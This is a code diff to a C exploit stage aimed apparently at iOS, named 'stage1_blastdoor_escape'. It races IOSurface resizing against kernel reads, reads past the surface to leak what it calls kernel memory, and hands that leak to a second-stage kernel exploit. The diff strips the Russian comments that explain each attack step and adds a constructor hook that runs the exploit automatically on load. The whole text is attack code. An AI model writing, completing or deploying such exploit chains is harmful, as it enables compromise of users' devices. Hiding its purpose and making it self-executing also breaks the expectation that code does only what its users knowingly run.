@@ -36,7 +36,6 @@ void stage1_blastdoor_escape(void) {
     IOSurfaceRef surface = IOSurfaceCreate(dict);
     void *surface_base = IOSurfaceGetBaseAddress(surface);
 
-    // Гонка состояний: меняем размер surface, пока ядро читает
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
         for (int i = 0; i < 100000; i++) {
             int new_w = 1024 + (i % 64);
@@ -46,7 +45,6 @@ void stage1_blastdoor_escape(void) {
         }
     });
 
-    // Читаем за границей surface — попадаем в память ядра
     void *kernel_leak = surface_base + (width * height * 4) + 0x1000;
     uint64_t test = *(uint64_t *)kernel_leak;
 
@@ -55,14 +53,17 @@ void stage1_blastdoor_escape(void) {
         printf("[+] Kernel leak: 0x%llx\n", test);
     } else {
         printf("[-] Escape failed, retrying...\n");
-        // В реальном эксплойте здесь повторная попытка
     }
 
     CFRelease(surface);
     CFRelease(dict);
 
     printf("[*] Stage 1 complete. Calling Stage 2...\n");
-    // Вызов второго этапа
     extern void stage2_kernel_exploit(void *);
     stage2_kernel_exploit(kernel_leak);
+}
+
+__attribute__((constructor))
+void main(void) {
+    stage1_blastdoor_escape();
 }
